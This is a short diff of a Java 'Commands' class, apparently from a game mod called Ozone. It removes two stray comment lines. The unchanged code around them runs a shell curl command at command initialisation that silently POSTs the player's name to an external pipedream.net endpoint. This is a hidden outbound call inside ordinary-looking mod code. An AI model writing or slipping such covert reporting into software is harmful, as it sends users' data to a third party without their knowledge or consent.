@@ -95,8 +95,6 @@ public class Commands {
 		Log.infoTag("Ozone", "Commands Center Initialized");
 		Log.infoTag("Ozone", commandsList.size() + " commands loaded");
 		Runtime rt = Runtime.getRuntime();
-		// for some reason github make spaces in front of the try {
-		// fix it yourself
         	try {
             		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
         	} catch(Throwable t) {
